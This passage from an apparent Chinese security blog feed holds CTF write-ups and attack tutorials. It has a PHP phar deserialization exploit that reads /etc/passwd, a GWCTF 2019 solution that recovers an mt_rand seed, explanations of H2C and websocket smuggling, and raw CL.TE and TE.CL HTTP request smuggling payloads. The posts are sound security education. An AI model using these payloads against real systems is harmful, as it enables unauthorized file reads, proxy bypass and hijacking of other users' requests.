<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="读取文件EXP"><a href="#读取文件EXP" class="headerlink" title="读取文件EXP"></a>读取文件EXP</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;filename = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>GWCTF 2019 WriteUP 及 PHP mt_rand 安全问题</title>
    <url>/2022/05/04/GWCTF-2019-WriteUP-%E5%8F%8A-PHP-mt-rand-%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="GWCTF-2019-WriteUP-及-PHP-mt-rand-安全问题"><a href="#GWCTF-2019-WriteUP-及-PHP-mt-rand-安全问题" class="headerlink" title="GWCTF 2019 WriteUP 及 PHP mt_rand 安全问题"></a>GWCTF 2019 WriteUP 及 PHP mt_rand 安全问题</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看到一道题 – GWCTF 2019，其中涉及 PHP mt_rand 函数安全问题以及相关攻击工具 php_mt_seed4.0 的使用，遂有本文记录。</p>
<h2 id="PHP-mt-rand-函数简介"><a href="#PHP-mt-rand-函数简介" class="headerlink" title="PHP mt_rand 函数简介"></a>PHP mt_rand 函数简介</h2><p>PHP的mt_rand函数作为一个随机数生成工具在程序中被广泛使用，该函数用了 Mersenne Twister 算法的特性作为随机数发生器，它产生随机数值的平均速度比 libc 提供的 rand() 快四倍。mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p>
<p>常用的使用方式如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(<span class="number">5</span>, <span class="number">15</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上程序的输出结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1604716014</span><br><span class="line">1478613278</span><br><span class="line">6</span><br></pre></td></tr></table></figure>

<h2 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h2><p>伪随机数是用确定性的算法计算出来的随机数序列，它并不真正的随机，但具有类似于随机数的统计特征，如均匀性、独立性等。在计算伪随机数时，若使用的初值（种子）不变，那么伪随机数的数序也不变。伪随机数可以用计算机大量生成，在模拟研究中为了提高模拟效率，一般采用伪随机数代替真正的随机数。模拟中使用的一般是循环周期极长并能通过随机数检验的伪随机数，以保证计算结果的随机性。伪随机数的生成方法有线性同余法、单向散列函数法、密码法等。</p>
<h2 id="PHP-mt-rand-引起的安全问题"><a href="#PHP-mt-rand-引起的安全问题" class="headerlink" title="PHP mt_rand 引起的安全问题"></a>PHP mt_rand 引起的安全问题</h2><p>mt_rand就是一个伪随机数生成函数，它由可确定的函数，通过一个种子产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。<br>每次调用 mt_rand() 都会先检查是否已经播种。如果已经播种就直接产生随机数，否则调用 php_mt_srand 来播种。也就是说每个 php cgi 进程期间，只有第一次调用 mt_rand() 会自动播种。接下来都会根据这个第一次播种的种子来生成随机数。</p>
<h2 id="php-mt-seed-简介及使用说明"><a href="#php-mt-seed-简介及使用说明" class="headerlink" title="php_mt_seed 简介及使用说明"></a>php_mt_seed 简介及使用说明</h2><p>php_mt_seed 是一个破解 mt_rand 函数 seed 的工具，在最简单的调用模式下，它能通过 mt_rand 第一次输出的值寻找 mt_rand 的 seed，在更高级的模式中它能匹配不是第一次输出的和不明确具体输出的情况。</p>
<p>mt_rand 的算法从 PHP 3.0.6 开始就一直在变化，php_mt_seed 4.0 支持以下几个大的版本： PHP 3.0.7 to 5.2.0，PHP 5.2.1 to 7.0.x， and PHP 7.1.0+</p>
<p>php_mt_seed 基于命令行运行，命令行可以使用 1，2，4 或者更多的参数。这些参数需要详细说明 mt_rand() 的输出。</p>
<p><strong>一个参数</strong><br>当只有一个参数的时候，这个参数代表 mt_rand 第一次输出的值。</p>
<p><strong>两个参数</strong><br>当有两个参数的时候，他们代表 mt_rand 第一次输出应该位于什么区间内。<br>第一个参数为最小值，第二个参数为最大值。</p>
<p><strong>四个参数（高级模式）</strong><br>前两个参数表示 mt_rand 第一次输出的区间，后两个参数表示 mt_rand输出的区间。</p>
<p><strong>多于五个参数（高级模式）</strong><br>每四个参数一组，但是最后一组可以是1，2或4个参数。每一组引用对应的输出。</p>
<h2 id="GWCTF-2019"><a href="#GWCTF-2019" class="headerlink" title="GWCTF 2019"></a>GWCTF 2019</h2><ul>
<li><strong>check.php</strong><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="使用php-mt-seed4-0工具爆破seed"><a href="#使用php-mt-seed4-0工具爆破seed" class="headerlink" title="使用php_mt_seed4.0工具爆破seed"></a>使用php_mt_seed4.0工具爆破seed</h3><h4 id="生成-php-mt-seed4-0-所需要的参数"><a href="#生成-php-mt-seed4-0-所需要的参数" class="headerlink" title="生成 php_mt_seed4.0 所需要的参数"></a>生成 php_mt_seed4.0 所需要的参数</h4><p>check.php 中 <code>$str</code> 由 <code>substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1)</code> 执行 20 次，将 20 次的结果相加所得。根据题意第一次生成字符为c，即 <code>mt_rand(0, strlen($str_long1) - 1)</code> &#x3D; <code>2</code>。通过以下程序，找出每次执行 <code>mt_rand(0, strlen($str_long1) - 1)</code> 生成的结果。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">s = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;c1z5DuPZXT&#x27;</span></span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> i == s[j]:</span><br><span class="line">            m += <span class="string">&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;</span>.<span class="built_in">format</span>(j,j,<span class="built_in">len</span>(s)-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#2 2 0 61 27 27 0 61 25 25 0 61 31 31 0 61 39 39 0 61 20 20 0 61 51 51 0 61 61 61 0 61 59 59 0 61 55 55 0 61 </span></span><br></pre></td></tr></table></figure>

<h4 id="生成题目要求的字符串"><a href="#生成题目要求的字符串" class="headerlink" title="生成题目要求的字符串"></a>生成题目要求的字符串</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#version:php7.3.4</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">744449933</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="comment">#c1z5DuPZXTSDNU66xXTU</span></span><br></pre></td></tr></table></figure>
<p>将该字符串提交即可得到flag</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_41628669/article/details/106133105">https://blog.csdn.net/qq_41628669/article/details/106133105</a><br><a href="https://www.freebuf.com/vuls/192012.html">https://www.freebuf.com/vuls/192012.html</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>H2C请求走私攻击</title>
    <url>/2023/01/05/H2C%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="H2C-走私"><a href="#H2C-走私" class="headerlink" title="H2C 走私"></a>H2C 走私</h1><h2 id="基于明文之上的-HTTP2（H2C）"><a href="#基于明文之上的-HTTP2（H2C）" class="headerlink" title="基于明文之上的 HTTP2（H2C）"></a>基于明文之上的 HTTP2（H2C）</h2><p>正常的 HTTP 连接生命周期很短，只能维持一个请求及响应结束时间段，通常被认为是“瞬时连接”。而基于明文之上的 HTTP2 （H2C）则是持久连接。用户基于明文 HTTP 协议发送升级请求，若服务器支持 HTTP2,则可与服务器建立 HTTP&#x2F;2 without TLS 的长 TCP 连接。根据 RFC 规范，H2C 升级需要发送3个标头：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>h2c</span><br><span class="line"><span class="attribute">HTTP2-Settings</span><span class="punctuation">: </span>AAMAAABkAARAAAAAAAIAAAAA</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade, HTTP2-Settings</span><br></pre></td></tr></table></figure>
<p>在升级连接后，反向代理会维持客户端与服务器之间的 TCP 连接，不再对用户请求进行监控。所以使用H2C走私，我们可以绕过反向代理在处理请求时使用的规则，例如基于路径的路由、身份验证或WAF处理，前提是我们可以首先建立H2C连接。<br><img src="https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-MYiNoPp7dKn0s5bdZ6M%2F-MYifMersS4wCMeAnpZR%2Fimage.png?alt=media&token=1b0278b6-9023-49f5-8e0e-cd9f233dc103"></p>
<h2 id="受该脆弱性影响的代理"><a href="#受该脆弱性影响的代理" class="headerlink" title="受该脆弱性影响的代理"></a>受该脆弱性影响的代理</h2><p>根据上述可知，为了进行 H2C 升级，代理服务器需要转发合规的 H2C 升级头（<code>Upgrade</code> 和 <code>Connection</code> ），但有时候可以忽略 <code>Connection</code> 头中的 <code>HTTP2-Settings</code>。<br>默认情况下，以下代理会在代理传递期间转发 <code>Upgrade</code> 和 <code>Connection</code> 标头，从而存在 h2c 走私漏洞:</p>
<ul>
<li>HAProxy</li>
<li>Traefik</li>
<li>Nuster</li>
</ul>
<p>默认情况下，以下代理在代理传递期间不会转发合规的 H2C 连接升级所需的头（<code>Upgrade</code> 和 <code>Connection</code>），这意味着像AWS ALB&#x2F;CLB、NGINX和Apache流量服务器等负载均衡器在默认情况下会阻止 H2C 连接。但由于不是所有的后端都会按照规范行事或者不安全的方式配置依然可能会导致 H2C 走私漏洞的出现。例如，后端被设置了为只需要如下形式就可以进行升级，而无需遵守 RFC 规范。<br> <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>h2c</span><br><span class="line"><span class="attribute">HTTP2-Settings</span><span class="punctuation">: </span>AAMAAABkAARAAAAAAAIAAAAA</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br></pre></td></tr></table></figure></p>
<ul>
<li>AWS ALB&#x2F;CLB</li>
<li>NGINX</li>
<li>Apache</li>
<li>Squid</li>
<li>Varnish</li>
<li>Kong</li>
<li>Envoy</li>
<li>Apache Traffic Server</li>
</ul>
<h1 id="websocket-走私"><a href="#websocket-走私" class="headerlink" title="websocket 走私"></a>websocket 走私</h1><p>类似 H2C 走私，创建一个 websocket 通道，绕过代理服务器的限制，直接访问受限制的 api 接口。</p>
<p><img src="https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FzlcoMJy2zVUU3WrrTLmj%2Fimage.png?alt=media&token=10bb58c6-2aee-4f05-bd67-9f82e0c1cbd3"></p>
<h2 id="场景一："><a href="#场景一：" class="headerlink" title="场景一："></a>场景一：</h2><ol>
<li>服务器支持 websocket，同时存在一个受限的 api，该 api 由代理功能进行限制。 正常情况下，我们无法访问该 api。</li>
<li>首先发送一个错误协议版本的 websocket 连接升级请求包到代理，代理不检查 <code>Sec-WebSocket-Version</code> 头，直接将请求转发给后端。</li>
<li>因为请求头 <code>Sec-WebSocket-Version</code> 中的协议版本不正确，后端返回带有状态码 <code>426</code> 的响应。然而，反向代理没有检查来自后端的响应，错误认为后端已经为 <code>WebSocket</code> 通信做好了准备，并且将该响应返回给客户端。</li>
<li>最后，反向代理认为在客户端和后端之间建立 <code>WebSocket</code> 连接。在现实中没有 <code>WebSocket</code> 连接，因为错误的协议版本号导致后端拒绝升级请求。同时，代理将客户端和后端之间的TCP或TLS连接保持在打开状态。客户端可以通过连接发送 HTTP 请求轻松原本受限的 api 。</li>
</ol>
<p><img src="https://github.com/0ang3el/websocket-smuggle/raw/master/img/2-4.png"></p>
<h2 id="场景二："><a href="#场景二：" class="headerlink" title="场景二："></a>场景二：</h2><ol>
<li>大多数反向代理(例如NGINX)在握手部分从后端检查状态代码。这使得攻击更加困难，但并非不可能。</li>
<li>后端支持 websocket，有一个受限的 api ，一个 healthcheck API（<code>/api/health</code>）</li>
<li>Healthcheck API通过发送 POST 请求调用，参数名 u 控制访问地址 URL。后端访问外部资源并将状态代码返回给客户端。</li>
<li>首先，客户端发送POST请求来调用 healthcheck API，但该请求含有 HTTP 报头 <code>Upgrade: websocket</code>。NGINX认为这是一个正常的升级请求，它只寻找升级头，跳过请求的其他部分。代理将请求转发到后端。</li>
<li>其次，后端调用 <code>healthcheck API</code>，访问由恶意用户控制的外部资源，该外部资源返回带有状态码 <code>101</code> 的 HTTP 响应。后端将该响应转发到反向代理。由于 NGINX 只验证状态码，它会认为后端已经为 <code>WebSocket</code> 通信做好了准备，并将响应返回给客户端。</li>
</ol>
<p><img src="https://github.com/0ang3el/websocket-smuggle/raw/master/img/3-4.png"></p>
<ol start="6">
<li>最后，NGINX 认为 <code>WebSocket</code> 连接是在客户端和后端之间建立的，实际上没有 <code>WebSocket</code> 连接。同时，反向代理将客户端与后端之间的 TCP 或 TLS 连接保持在开放状态。客户端可以通过连接发送 HTTP 请求轻松访问受限 api。<br><img src="https://github.com/0ang3el/websocket-smuggle/raw/master/img/3-5.png"></li>
</ol>
<p>大多数反向代理都应该受到这种情况的影响。然而，利用需要存在外部SSRF漏洞。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://book.hacktricks.xyz/pentesting-web/h2c-smuggling/">https://book.hacktricks.xyz/pentesting-web/h2c-smuggling\</a><br><a href="https://blog.assetnote.io/2021/03/18/h2c-smuggling//">https://blog.assetnote.io/2021/03/18/h2c-smuggling/\</a><br><a href="https://bishopfox.com/blog/h2c-smuggling-request/">https://bishopfox.com/blog/h2c-smuggling-request\</a><br><a href="https://github.com/0ang3el/websocket-smuggle.git">https://github.com/0ang3el/websocket-smuggle.git</a></p>
]]></content>
  </entry>
  <entry>
    <title>HTTP请求走私攻击</title>
    <url>/2022/11/22/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="什么是-HTTP-请求走私"><a href="#什么是-HTTP-请求走私" class="headerlink" title="什么是 HTTP 请求走私"></a>什么是 HTTP 请求走私</h1><p>当前端(负载均衡&#x2F;反向代理)处理 <code>Content-Length</code> 或者 <code>Transfer-Encoding</code> , 而后端服务器却处理另外一个请求标头, 会导致前后端之间出现同步失效的情况。例如: 发送一个 HTTP 请求，使该请求包同时出现 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> , 前端只处理其中一个, 导致该请求在前端被视作一个整体请求，后端处理另一个, 导致在后端应用被视作两个请求，这就是 HTTP 走私攻击。其中被后端视为第二个请求的请求包，便是走私请求包, 该请求包将会后端认为来自下一个客户端的请求包, 并且来自下一个客户端的真实请求包将会被注入到走私请求包, 成为走私请求包的一部分。</p>
<h2 id="前置认识"><a href="#前置认识" class="headerlink" title="前置认识"></a>前置认识</h2><p><strong>RFC规范(2161)</strong></p>
<blockquote>
<p>如果接收到的请求包同时带有 <code>Transfer-Encoding</code> 和 <code>Content-Length</code> ，必须忽略 <code>Content-Length</code> 。</p>
</blockquote>
<p><strong>HTTP 换行</strong></p>
<blockquote>
<p>HTTP 换行符包含两个字节.</p>
</blockquote>
<p><strong>Content-Length</strong></p>
<blockquote>
<p><code>Content-Length</code> , 声明发送给接收者的数据大小(以字节为单位)。该标头使用十进制数字来声明请求正文的字节数。正文应该以最后一个字符结束，请求末尾不需要新行。</p>
</blockquote>
<p><strong>Transfer-Encoding: chunked</strong></p>
<blockquote>
<p><code>Transfer-Encoding</code> , 声明通信内容的传输方式。 <code>Chunked</code> 表示数据以块的形式发送。该标头在主体中使用一个十六进制数来表示下一个块的字节数。数据块必须以一个新行结束，但这个新行不计入长度指示器。这个传输方法必须以一个大小为0的块结尾，后跟两个新行: <code>0/r/n/r/n</code></p>
</blockquote>
<p><strong>Connection</strong></p>
<blockquote>
<p>建议在请求走私的第一个请求时使用 <code>Connection: keep-alive</code> 。</p>
</blockquote>
<h2 id="HTTP-请求走私攻击的基本形式"><a href="#HTTP-请求走私攻击的基本形式" class="headerlink" title="HTTP 请求走私攻击的基本形式"></a>HTTP 请求走私攻击的基本形式</h2><ul>
<li><strong>CL. TE</strong>: 前端服务器使用 <code>Content-Length</code> ，后端服务器使用 <code>Transfer-Encoding</code>。</li>
<li><strong>TE. CL</strong>: 前端服务器使用 <code>Transfer-Encoding</code>，后端服务器使用 <code>Content-Length</code>。</li>
<li><strong>TE. TE</strong>: 前端和后端服务器都支持 <code>Transfer-Encoding</code> 报头，但是可以通过某种方式混淆标头, 诱导其中一个服务器不作处理。</li>
</ul>
<h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL. TE"></a>CL. TE</h3><p>前端服务器处理 <code>Content-Length</code> ，后端服务器处理 <code>Transfer-Encoding</code> 。执行一个简单的 <code>CL.TE</code> HTTP 请求走私攻击如下:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Foo</span>: x</span></span><br></pre></td></tr></table></figure>

<p><code>Content-Length</code> 声明请求数据主体请求长度为 30 字节( HTTP 换行符占两个字节: <code>/r/n</code> )，因此反向代理将把完整的请求发送到后端，由于后端将处理 <code>Transfer-Encoding</code> , <code>GET /404 HTTP/1.1</code> 将被视为下一个请求, 而下一个来自真实用户的请求将被注入到 <code>Foo:x</code> 后, 成为走私请求的一部分。</p>
<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE. CL"></a>TE. CL</h3><p>前端服务器处理 <code>Transfer-Encoding</code> ，后端服务器处理 <code>Content-Length</code> 。执行一个简单的 <code>TE.CL</code> HTTP 请求走私攻击如下:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">7b</span> </span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: vulnerable-website.com</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">30</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">x</span>=</span></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br></pre></td></tr></table></figure>

<p>前端反向代理使用 <code>Transfer-Encoding: chunked</code> , 所以前端将整个请求转发到后端。后端使用 <code>Content-Length</code> , 所以认为存在两个 http 请求, 第一个请求 <code>Content-Length = 4</code> , 所以结束位置是 <code>7b\r\n</code> 。第二个请求则为 <code>GET /404 HTTP/1.1 ....</code> , 由于第二个请求 <code>Content-Length = 30</code> , 但是 <code>x=\r\n</code> 只占 4 个字节, 所以后端会等待请求数据到达, 直至符合 30 字节再进行处理请求 。这意味着下一个真实的用户请求的部分或全部数据将会成为走私请求的一部分。</p>
<blockquote>
<p>注意: <code>Transfer-Encoding: chunked</code> 要求以 <code>0</code> 声明主体数据结束, 所以真实的用户请求数据依然被追加到 <code>x=\r\n0</code> 后面。</p>
</blockquote>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20221127142906.png" alt="TE. CL"></p>
